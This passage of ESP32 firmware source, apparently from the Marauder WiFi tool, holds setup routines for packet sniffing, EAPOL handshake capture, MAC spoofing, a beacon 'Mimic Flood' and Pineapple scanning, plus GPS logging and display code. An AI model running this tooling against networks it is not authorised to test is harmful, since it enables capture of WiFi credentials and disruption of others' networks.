  void WiFiScan::RunLvJoinWiFi(uint8_t scan_mode, uint16_t color) {
  
    #ifdef HAS_TOUCH
      display_obj.tft.init();
      display_obj.tft.setRotation(1);
    #endif
    
    #ifndef HAS_CYD_TOUCH
      #ifdef TFT_SHIELD
        uint16_t calData[5] = { 391, 3491, 266, 3505, 7 }; // Landscape TFT Shield
        Serial.println("Using TFT Shield");
      #else if defined(TFT_DIY)
        uint16_t calData[5] = { 213, 3469, 320, 3446, 1 }; // Landscape TFT DIY
        Serial.println("Using TFT DIY (join wifi)");
      #endif
      #ifdef HAS_ILI9341
        display_obj.tft.setTouch(calData);
      #endif
    #else
      //display_obj.touchscreen.setRotation(1);
    #endif
    
    #ifdef HAS_TOUCH
      lv_obj_t * scr = lv_cont_create(NULL, NULL);
      lv_disp_load_scr(scr);
    #endif
  
  }
#endif

void WiFiScan::RunClearStations() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[45]));
    display_obj.tft.println(text_table4[46] + (String)this->clearStations());
  #else
    this->clearStations();
  #endif
}

void WiFiScan::RunClearAPs() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[9]));
    display_obj.tft.println(text_table4[10] + (String)this->clearAPs());
    display_obj.tft.println(F(text_table4[45]));
    display_obj.tft.println(text_table4[46] + (String)this->clearStations());
  #else
    this->clearAPs();
    this->clearStations();
  #endif
}

void WiFiScan::RunClearSSIDs() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[11]));
    display_obj.tft.println(text_table4[12] + (String)this->clearSSIDs());
  #else
    this->clearSSIDs();
  #endif
}

void WiFiScan::setMac() {
  wifi_mode_t currentWiFiMode;
  esp_wifi_get_mode(&currentWiFiMode);
  esp_err_t result;
  result = esp_wifi_set_mac(WIFI_IF_AP, this->ap_mac);
  if ((result != ESP_OK) &&
      ((currentWiFiMode == WIFI_MODE_AP) || (currentWiFiMode == WIFI_MODE_APSTA) || (currentWiFiMode == WIFI_MODE_NULL)))
        Serial.printf("Failed to set AP MAC: %s | 0x%X\n", macToString(this->ap_mac), result);
  else if ((currentWiFiMode == WIFI_MODE_AP) || (currentWiFiMode == WIFI_MODE_APSTA) || (currentWiFiMode == WIFI_MODE_NULL))
    Serial.println("Successfully set AP MAC: " + macToString(this->ap_mac));

  // Do the station  
  result = esp_wifi_set_mac(WIFI_IF_STA, this->sta_mac);
  if ((result != ESP_OK) &&
      ((currentWiFiMode == WIFI_MODE_STA) || (currentWiFiMode == WIFI_MODE_APSTA)))
        Serial.printf("Failed to set STA MAC: %s | 0x%X\n", macToString(this->sta_mac), result);
  else if ((currentWiFiMode == WIFI_MODE_STA) || (currentWiFiMode == WIFI_MODE_APSTA))
    Serial.println("Successfully set STA MAC: " + macToString(this->sta_mac));
}

void WiFiScan::RunSetMac(uint8_t * mac, bool ap) {
  if (ap) {
    for (int i = 0; i < 6; i++) {
      this->ap_mac[i] = mac[i];
    }
  }
  else {
    for (int i = 0; i < 6; i++) {
      this->sta_mac[i] = mac[i];
    }
  }

  if (ap) Serial.println("Setting AP MAC: " + macToString(this->ap_mac));
  else Serial.println("Setting STA MAC: " + macToString(this->sta_mac));

  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
    if (ap) display_obj.tft.println("Setting AP MAC: " + macToString(this->ap_mac));
    else display_obj.tft.println("Setting STA MAC: " + macToString(this->sta_mac));
  #endif
}

void WiFiScan::RunGenerateRandomMac(bool ap) {
  if (ap) generateRandomMac(this->ap_mac);
  else generateRandomMac(this->sta_mac);

  if (ap) Serial.println("Setting AP MAC: " + macToString(this->ap_mac));
  else Serial.println("Setting STA MAC: " + macToString(this->sta_mac));

  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
    if (ap) display_obj.tft.println("Setting AP MAC: " + macToString(this->ap_mac));
    else display_obj.tft.println("Setting STA MAC: " + macToString(this->sta_mac));
  #endif
}

void WiFiScan::RunGenerateSSIDs(int count) {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[13]));
  
    display_obj.tft.println(text_table4[14] + (String)this->generateSSIDs());
    display_obj.tft.println(text_table4[15] + (String)ssids->size());
  #else
    this->generateSSIDs(count);
  #endif
}

void WiFiScan::logPoint(String lat, String lon, float alt, String datetime) {
  datetime.replace(" ", "T");
  datetime += "Z";

  buffer_obj.append("    <trkpt lat=\"" + lat + "\" lon=\"" + lon + "\">\n");
  buffer_obj.append("      <ele>" + String(alt, 2) + "</ele>\n");
  buffer_obj.append("      <time>" + datetime + "</time>\n");
  buffer_obj.append("    </trkpt>\n");
  //gpxFile.flush();
}

void WiFiScan::writeHeader() {
  Serial.println("Writing header to GPX file...");
  buffer_obj.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
  buffer_obj.append("<gpx version=\"1.1\" creator=\"ESP32 GPS Logger\" xmlns=\"http://www.topografix.com/GPX/1/1\">\n");
  buffer_obj.append("  <trk>\n");
  buffer_obj.append("    <name>ESP32 Track</name>\n");
  buffer_obj.append("    <trkseg>\n");
}

void WiFiScan::writeFooter() {
  Serial.println("Writing footer to GPX file...\n");
  buffer_obj.append("    </trkseg>\n");
  buffer_obj.append("  </trk>\n");
  buffer_obj.append("</gpx>\n");
}

void WiFiScan::RunSetupGPSTracker() {
  this->startGPX("tracker");
  this->writeHeader();
  initTime = millis();
}

void WiFiScan::RunGPSInfo(bool tracker) {
  #ifdef HAS_GPS
    String text=gps_obj.getText();

    if (tracker) {
      if (gps_obj.getFixStatus()) {
        this->logPoint(gps_obj.getLat(), gps_obj.getLon(), gps_obj.getAlt(), gps_obj.getDatetime());
      }
    }

    Serial.println("Refreshing GPS Data on screen...");
    #ifdef HAS_SCREEN

      // Get screen position ready
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, SCREEN_HEIGHT / 3);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);

      // Clean up screen first
      //display_obj.tft.fillRect(0, 0, 240, STATUS_BAR_WIDTH, STATUSBAR_COLOR);
      display_obj.tft.fillRect(0, (SCREEN_HEIGHT / 3) - 6, SCREEN_WIDTH, SCREEN_HEIGHT - ((SCREEN_HEIGHT / 3) - 6), TFT_BLACK);

      // Print the GPS data: 3
      display_obj.tft.setCursor(0, SCREEN_HEIGHT / 3);
      if (gps_obj.getFixStatus())
        display_obj.tft.println("  Good Fix: Yes");
      else
        display_obj.tft.println("  Good Fix: No");
        
      if(text != "") display_obj.tft.println("      Text: " + text);

      display_obj.tft.println("Satellites: " + gps_obj.getNumSatsString());
      display_obj.tft.println("  Accuracy: " + (String)gps_obj.getAccuracy());
      display_obj.tft.println("  Latitude: " + gps_obj.getLat());
      display_obj.tft.println(" Longitude: " + gps_obj.getLon());
      display_obj.tft.println("  Altitude: " + (String)gps_obj.getAlt());
      display_obj.tft.println("  Datetime: " + gps_obj.getDatetime());
    #endif

    // Display to serial
    Serial.println("==== GPS Data ====");
    if (gps_obj.getFixStatus())
      Serial.println("  Good Fix: Yes");
    else
      Serial.println("  Good Fix: No");
      
    if(text != "") Serial.println("      Text: " + text);

    Serial.println("Satellites: " + gps_obj.getNumSatsString());
    Serial.println("  Accuracy: " + (String)gps_obj.getAccuracy());
    Serial.println("  Latitude: " + gps_obj.getLat());
    Serial.println(" Longitude: " + gps_obj.getLon());
    Serial.println("  Altitude: " + (String)gps_obj.getAlt());
    Serial.println("  Datetime: " + gps_obj.getDatetime());
  #endif
}

void WiFiScan::RunGPSNmea() {
  #ifdef HAS_GPS
    LinkedList<nmea_sentence_t> *buffer=gps_obj.get_queue();
    bool queue_enabled=gps_obj.queue_enabled();

    String gxgga = gps_obj.generateGXgga();
    String gxrmc = gps_obj.generateGXrmc();

    if(!buffer||!queue_enabled)
      gps_obj.flush_queue();
    #ifndef HAS_SCREEN
      else
        gps_obj.flush_text();
    #else
      // Get screen position ready
      int offset=100;
      if((SCREEN_HEIGHT / 3)<offset)
        offset=SCREEN_HEIGHT/3; //for smaller screens
      if(offset<(TOP_FIXED_AREA+6))
        offset=TOP_FIXED_AREA+6; //absolute minimium
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, offset);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_GREEN);

      // Clean up screen first
      display_obj.tft.fillRect(0, offset-6, SCREEN_WIDTH, SCREEN_HEIGHT - (offset-6), TFT_BLACK);

      #ifdef GPS_NMEA_SCRNLINES
        int lines=GPS_NMEA_SCRNLINES;
      #else
        int lines=TEXT_HEIGHT;
        if(lines>((TFT_HEIGHT-offset-BOT_FIXED_AREA)/10))
          lines=(TFT_HEIGHT-offset-BOT_FIXED_AREA)/10;
      #endif

      String text=gps_obj.getText();
      if(queue_enabled){
        int queue=gps_obj.getTextQueueSize();
        if(queue>0){
          display_obj.tft.println(gps_obj.getTextQueue());
          lines-=queue; //used lines for text display
        }
        else
          if(text != ""){
            display_obj.tft.println(text);
            lines--;
          }
      }
      else
        if(text != ""){
          display_obj.tft.println(text);
          lines--;
        }

      #if GPS_NMEA_SCRNWRAP
        lines-=((gxgga.length()-1)/STANDARD_FONT_CHAR_LIMIT) + 1;
        lines-=((gxrmc.length()-1)/STANDARD_FONT_CHAR_LIMIT) + 1;
        display_obj.tft.setTextWrap(GPS_NMEA_SCRNWRAP);
      #else
        lines-=2; //two self-genned messages
      #endif
    #endif

    if(buffer && queue_enabled){
      int size=buffer->size();
      if(size){
        gps_obj.new_queue();
        for(int i=0;i<size;i++){
          nmea_sentence_t line=buffer->get(i);
          Serial.println(line.sentence);

          #ifdef HAS_SCREEN
            if(lines>0){
              if(line.unparsed){
                if(line.type != "" && line.type != "TXT" && line.type != "GGA" && line.type != "RMC"){
                  int length=line.sentence.length();
                  if(length){
                    #if GPS_NMEA_SCRNWRAP
                      if((((length-1)/STANDARD_FONT_CHAR_LIMIT) + 1)<=lines){
                    #endif
                        display_obj.tft.println(line.sentence);
                        #if GPS_NMEA_SCRNWRAP
                          lines-=((length-1)/STANDARD_FONT_CHAR_LIMIT) + 1;
                        #else
                          lines--;
                        #endif
                    #if GPS_NMEA_SCRNWRAP
                      }
                    #endif
                  }
                }
              }
            }
          #endif
        }
        delete buffer;
      }
    } else {
      static String old_nmea_sentence="";
      String nmea_sentence=gps_obj.getNmeaNotimp();

      if(nmea_sentence != "" && nmea_sentence != old_nmea_sentence){
        old_nmea_sentence=nmea_sentence;
        Serial.println(nmea_sentence);
      }

      #ifdef HAS_SCREEN
        if(lines>0){
          String display_nmea_sentence=gps_obj.getNmeaNotparsed();
          int length=display_nmea_sentence.length();
          if(length)
            #if GPS_NMEA_SCRNWRAP
              if((((length-1)/STANDARD_FONT_CHAR_LIMIT) + 1)<=lines)
            #endif
                display_obj.tft.println(display_nmea_sentence);
        }
      #endif
    }

    #ifdef HAS_SCREEN
      display_obj.tft.println(gxgga);
      display_obj.tft.println(gxrmc);
      #if GPS_NMEA_SCRNWRAP
        display_obj.tft.setTextWrap(false);
      #endif
    #endif

    gps_obj.sendSentence(Serial, gxgga.c_str());
    gps_obj.sendSentence(Serial, gxrmc.c_str());

  #endif
}

void WiFiScan::RunAPInfo(uint16_t index, bool do_display) {
  #ifdef HAS_SCREEN
    if (do_display) {
      display_obj.tft.setCursor(0, (STATUS_BAR_WIDTH * 2) + CHAR_WIDTH + KEY_H);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
    }
  #endif

  Serial.println("   ESSID: " + (String)access_points->get(index).essid);
  Serial.println("   BSSID: " + (String)macToString(access_points->get(index).bssid));
  Serial.println(" Channel: " + (String)access_points->get(index).channel);
  Serial.println("    RSSI: " + (String)access_points->get(index).rssi);
  Serial.println("  Frames: " + (String)access_points->get(index).packets);
  Serial.println("Stations: " + (String)access_points->get(index).stations->size());
  Serial.println("   Brand: " + (String)access_points->get(index).man);
  
  uint8_t sec = access_points->get(index).sec;
  bool wps = access_points->get(index).wps;

  Serial.print("Security: ");
  switch (sec) {
    case WIFI_SECURITY_OPEN:             Serial.println("Open"); break;
    case WIFI_SECURITY_WEP:              Serial.println("WEP"); break;
    case WIFI_SECURITY_WPA:              Serial.println("WPA"); break;
    case WIFI_SECURITY_WPA2:             Serial.println("WPA2"); break;
    case WIFI_SECURITY_WPA3:             Serial.println("WPA3"); break;
    case WIFI_SECURITY_WPA_WPA2_MIXED:   Serial.println("WPA/WPA2 Mixed"); break;
    case WIFI_SECURITY_WPA2_ENTERPRISE:  Serial.println("WPA2 Enterprise"); break;
    case WIFI_SECURITY_WPA3_ENTERPRISE:  Serial.println("WPA3 Enterprise"); break;
    case WIFI_SECURITY_WAPI:             Serial.println("WAPI"); break;
    default:                             Serial.println("Unknown"); break;
  }

  Serial.print("     WPS: ");
  switch (wps) {
    case true:                           Serial.println("true"); break;
    case false:                          Serial.println("false"); break;
    default:                             Serial.println("false"); break;
  }

  #ifdef HAS_SCREEN
    if (do_display) {
      display_obj.tft.println("   ESSID: " + (String)access_points->get(index).essid);
      display_obj.tft.println("   BSSID: " + (String)macToString(access_points->get(index).bssid));
      display_obj.tft.println(" Channel: " + (String)access_points->get(index).channel);
      display_obj.tft.println("    RSSI: " + (String)access_points->get(index).rssi);
      display_obj.tft.println("  Frames: " + (String)access_points->get(index).packets);
      display_obj.tft.println("Stations: " + (String)access_points->get(index).stations->size());
      display_obj.tft.println("   Brand: " + (String)access_points->get(index).man);

      display_obj.tft.print("Security: ");
      switch (sec) {
        case WIFI_SECURITY_OPEN:             display_obj.tft.println("Open"); break;
        case WIFI_SECURITY_WEP:              display_obj.tft.println("WEP"); break;
        case WIFI_SECURITY_WPA:              display_obj.tft.println("WPA"); break;
        case WIFI_SECURITY_WPA2:             display_obj.tft.println("WPA2"); break;
        case WIFI_SECURITY_WPA3:             display_obj.tft.println("WPA3"); break;
        case WIFI_SECURITY_WPA_WPA2_MIXED:   display_obj.tft.println("WPA/WPA2 Mixed"); break;
        case WIFI_SECURITY_WPA2_ENTERPRISE:  display_obj.tft.println("WPA2 Enterprise"); break;
        case WIFI_SECURITY_WPA3_ENTERPRISE:  display_obj.tft.println("WPA3 Enterprise"); break;
        case WIFI_SECURITY_WAPI:             display_obj.tft.println("WAPI"); break;
        default:                             display_obj.tft.println("Unknown"); break;
      }

      display_obj.tft.print("     WPS: ");
      switch (wps) {
        case true:                           display_obj.tft.println("true"); break;
        case false:                          display_obj.tft.println("false"); break;
        default:                             display_obj.tft.println("false"); break;
      }
    }
  #endif

  if (!access_points->get(index).selected) {
    Serial.println("Selected: false");
    #ifdef HAS_SCREEN
      if (do_display) {
        display_obj.tft.println("Selected: false");
      }
    #endif
  }
  else {
    Serial.println("Selected: true");
    #ifdef HAS_SCREEN
      if (do_display) {
        display_obj.tft.println("Selected: true");
      }
    #endif
  }

}

void WiFiScan::RunInfo()
{
  String sta_mac = this->getStaMAC();
  String ap_mac = this->getApMAC();
  String free_ram = this->freeRAM();

  Serial.println(free_ram);

  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, SCREEN_HEIGHT / 3);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
    display_obj.tft.println(text_table4[20]);
    display_obj.tft.println(text_table4[21] + display_obj.version_number);
    display_obj.tft.println("Hardware: " + (String)HARDWARE_NAME);
    display_obj.tft.println(text_table4[22] + (String)esp_get_idf_version());
  #endif

  Serial.println(text_table4[20]);
  Serial.println(text_table4[21] + (String)MARAUDER_VERSION);
  Serial.println("Hardware: " + (String)HARDWARE_NAME);
  Serial.println(text_table4[22] + (String)esp_get_idf_version());

  if (this->wsl_bypass_enabled) {
    #ifdef HAS_SCREEN
      display_obj.tft.println(text_table4[23]);
    #endif
    Serial.println(text_table4[23]);
  }
  else {
    #ifdef HAS_SCREEN
      display_obj.tft.println(text_table4[24]);
    #endif
    Serial.println(text_table4[24]);
  }

  #ifdef HAS_SCREEN
    display_obj.tft.println(text_table4[25] + sta_mac);
    display_obj.tft.println(text_table4[26] + ap_mac);
    display_obj.tft.println(text_table4[27] + free_ram);
  #endif
  Serial.println(text_table4[25] + sta_mac);
  Serial.println(text_table4[26] + ap_mac);
  Serial.println(text_table4[27] + free_ram);

  #if defined(HAS_SD)
    if (sd_obj.supported) {
      #ifdef HAS_SCREEN
        display_obj.tft.println(text_table4[28]);
        display_obj.tft.print(text_table4[29]);
        display_obj.tft.print(sd_obj.card_sz);
        display_obj.tft.println("MB");
      #endif
      Serial.println(text_table4[28]);
      Serial.print(text_table4[29]);
      Serial.print(sd_obj.card_sz);
      Serial.println("MB");
    } else {
      #ifdef HAS_SCREEN
        display_obj.tft.println(text_table4[30]);
        display_obj.tft.println(text_table4[31]);
      #endif
      Serial.println(text_table4[30]);
      Serial.println(text_table4[31]);
    }
  #endif

  #ifdef HAS_BATTERY
    battery_obj.battery_level = battery_obj.getBatteryLevel();
    if (battery_obj.i2c_supported) {
      #ifdef HAS_SCREEN
        display_obj.tft.println(text_table4[32]);
        display_obj.tft.println(text_table4[33] + (String)battery_obj.battery_level + "%");
      #endif
      Serial.println(text_table4[32]);
      Serial.println(text_table4[33] + (String)battery_obj.battery_level + "%");
    }
    else {
      #ifdef HAS_SCREEN
        display_obj.tft.println(text_table4[34]);
      #endif
      Serial.println(text_table4[34]);
    }
  #endif
  
  //#ifdef HAS_SCREEN
  //  display_obj.tft.println(text_table4[35] + (String)temp_obj.current_temp + " C");
  //#endif
}

void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color)
{
  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif

  if (scan_mode == WIFI_PACKET_MONITOR)
    startPcap("packet_monitor");

  #ifdef HAS_ILI9341
    if ((scan_mode != WIFI_SCAN_PACKET_RATE) &&
        (scan_mode != WIFI_SCAN_CHAN_ANALYZER)) {
      #ifdef HAS_SCREEN
        display_obj.tft.init();
        display_obj.tft.setRotation(1);
        display_obj.tft.fillScreen(TFT_BLACK);
      #endif
    
      #ifdef HAS_SCREEN
        #ifndef HAS_CYD_TOUCH
          #ifdef TFT_SHIELD
            uint16_t calData[5] = { 391, 3491, 266, 3505, 7 }; // Landscape TFT Shield
            Serial.println("Using TFT Shield");
          #else if defined(TFT_DIY)
            uint16_t calData[5] = { 213, 3469, 320, 3446, 1 }; // Landscape TFT DIY
            Serial.println("Using TFT DIY");
          #endif
          display_obj.tft.setTouch(calData);
        #else
          //display_obj.touchscreen.setRotation(1);
        #endif
      
        //display_obj.tft.setFreeFont(1);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setTextSize(1);
        display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); // Buttons
        display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // color key
      
        delay(10);
      
        display_obj.tftDrawGraphObjects(x_scale); //draw graph objects
        display_obj.tftDrawColorKey();
        display_obj.tftDrawXScaleButtons(x_scale);
        display_obj.tftDrawYScaleButtons(y_scale);
        display_obj.tftDrawChannelScaleButtons(set_channel);
        display_obj.tftDrawExitScaleButtons();
      #endif
    }
    else {
      display_obj.TOP_FIXED_AREA_2 = 48;
      display_obj.tteBar = true;
      display_obj.print_delay_1 = 15;
      display_obj.print_delay_2 = 10;
      display_obj.initScrollValues(true);
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setTextColor(TFT_WHITE, color);
      #ifdef HAS_FULL_SCREEN
        display_obj.tft.fillRect(0,16,240,16, color);
        if (scan_mode == WIFI_PACKET_MONITOR)
          display_obj.tft.drawCentreString(text_table1[45],120,16,2);
        else if (scan_mode == WIFI_SCAN_CHAN_ANALYZER) {
          display_obj.tft.setTextColor(TFT_BLACK, color);
          display_obj.tft.drawCentreString("Channel Analyzer", 120, 16, 2);
        }
        else if (scan_mode == WIFI_SCAN_PACKET_RATE) {
          display_obj.tft.drawCentreString("Packet Rate", 120, 16, 2);
        }
      #endif

      // Setup up portrait analyzer buttons
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
      display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
      display_obj.tftDrawChannelScaleButtons(set_channel, false);
      display_obj.tftDrawExitScaleButtons(false);
    }
  #else // Non touch
    #ifdef HAS_SCREEN
      display_obj.TOP_FIXED_AREA_2 = 48;
      display_obj.tteBar = true;
      display_obj.print_delay_1 = 15;
      display_obj.print_delay_2 = 10;
      display_obj.initScrollValues(true);
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setTextColor(TFT_WHITE, color);
      #ifdef HAS_FULL_SCREEN
        display_obj.tft.fillRect(0,16,240,16, color);
        if (scan_mode == WIFI_PACKET_MONITOR)
          display_obj.tft.drawCentreString(text_table1[45],120,16,2);
        else if (scan_mode == WIFI_SCAN_CHAN_ANALYZER)
          display_obj.tft.drawCentreString("Channel Analyzer", 120, 16, 2);
        else if (scan_mode == WIFI_SCAN_PACKET_RATE)
          display_obj.tft.drawCentreString("Packet Rate", 120, 16, 2);
      #endif
      #ifdef HAS_ILI9341
        display_obj.touchToExit();
      #endif
      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
      display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
    #endif
  #endif

  Serial.println("Running packet scan...");
  esp_wifi_init(&cfg2);
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  this->setMac();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  uint32_t initTime = millis();
}

void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color)
{
  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  num_eapol = 0;

  #ifdef HAS_ILI9341
    #ifdef HAS_SCREEN
      display_obj.tft.init();
      display_obj.tft.setRotation(1);
      display_obj.tft.fillScreen(TFT_BLACK);
    #endif
  
    startPcap("eapol");
  
    #ifdef HAS_SCREEN
      #ifndef HAS_CYD_TOUCH
        #ifdef TFT_SHIELD
          uint16_t calData[5] = { 391, 3491, 266, 3505, 7 }; // Landscape TFT Shield
          //Serial.println("Using TFT Shield");
        #else if defined(TFT_DIY)
          uint16_t calData[5] = { 213, 3469, 320, 3446, 1 }; // Landscape TFT DIY
          //Serial.println("Using TFT DIY");
        #endif
        display_obj.tft.setTouch(calData);
      #else
        //display_obj.touchscreen.setRotation(1);
      #endif
    
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setTextSize(1);
      display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); // Buttons
      display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // color key
    
      delay(10);
    
      display_obj.tftDrawGraphObjects(x_scale); //draw graph objects
      display_obj.tftDrawEapolColorKey();
      display_obj.tftDrawChannelScaleButtons(set_channel);
      display_obj.tftDrawExitScaleButtons();
    #endif
  #else
    startPcap("eapol");
    
    #ifdef HAS_SCREEN
      display_obj.TOP_FIXED_AREA_2 = 48;
      display_obj.tteBar = true;
      display_obj.print_delay_1 = 15;
      display_obj.print_delay_2 = 10;
      display_obj.initScrollValues(true);
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setTextColor(TFT_WHITE, color);
      #ifdef HAS_FULL_SCREEN
        display_obj.tft.fillRect(0,16,240,16, color);
        display_obj.tft.drawCentreString(text_table4[38],120,16,2);
      #endif
      #ifdef HAS_ILI9341
        display_obj.touchToExit();
      #endif
      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
      display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
    #endif
  #endif

  esp_wifi_init(&cfg);
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);

  esp_err_t err;
  wifi_config_t conf;
  err = esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR);
  if (err != 0)
  {
    Serial.print("could not set protocol : err=0x");
    Serial.println(err, HEX);
  }

  esp_wifi_get_config((wifi_interface_t)WIFI_IF_AP, &conf);
  conf.ap.ssid[0] = '\0';
  conf.ap.ssid_len = 0;
  conf.ap.channel = this->set_channel;
  conf.ap.ssid_hidden = 1;
  conf.ap.max_connection = 0;
  conf.ap.beacon_interval = 60000;

  err = esp_wifi_set_config((wifi_interface_t)WIFI_IF_AP, &conf);
  if (err != 0)
  {
    Serial.print("AP config set error, Maurauder SSID might visible : err=0x");
    Serial.println(err, HEX);
  }

  esp_wifi_start();
  this->setMac();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  if (scan_mode == WIFI_SCAN_ACTIVE_EAPOL)
    esp_wifi_set_promiscuous_rx_cb(&activeEapolSnifferCallback);
  else if (scan_mode == WIFI_SCAN_ACTIVE_LIST_EAPOL)
    esp_wifi_set_promiscuous_rx_cb(&activeEapolSnifferCallback);
  else
    esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}


// Function to prepare for beacon mimic
void WiFiScan::RunMimicFlood(uint8_t scan_mode, uint16_t color) {
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(" Mimic Flood ",120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
  #endif
  
  packets_sent = 0;
  esp_wifi_init(&cfg);
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_AP_STA);
  esp_wifi_start();
  this->setMac();
  esp_wifi_set_promiscuous_filter(NULL);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(78);
  this->wifi_initialized = true;
  initTime = millis();
}

// Pineapple
void WiFiScan::RunPineScan(uint8_t scan_mode, uint16_t color)
{
  this->clearPineScanTrackers();

  startPcap("pinescan");

  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table4[48],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_RED, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg2);
  #ifdef HAS_DUAL_BAND
